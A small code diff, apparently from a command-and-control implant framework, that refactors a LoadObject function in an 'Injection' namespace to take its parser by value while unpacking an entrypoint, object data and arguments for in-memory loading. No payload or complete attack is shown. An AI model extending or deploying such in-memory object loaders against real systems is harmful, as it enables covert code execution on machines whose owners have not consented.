@@ -51,7 +51,7 @@ namespace Injection {
         }
     }
 
-    VOID LoadObject(_parser *parser) {
+    VOID LoadObject(_parser parser) {
         HEXANE
 
         _executable object  = { };
@@ -62,9 +62,9 @@ namespace Injection {
         uint32_t arg_size   = 0;
         uint32_t req_id     = 0;
 
-        entrypoint  = Parser::UnpackString(parser, nullptr);
-        data        = Parser::UnpackBytes(parser, nullptr);
-        args        = Parser::UnpackBytes(parser, &arg_size);
+        entrypoint  = Parser::UnpackString(&parser, nullptr);
+        data        = Parser::UnpackBytes(&parser, nullptr);
+        args        = Parser::UnpackBytes(&parser, &arg_size);
 
         Memory::Methods::CreateImageData(B_PTR(data));
 
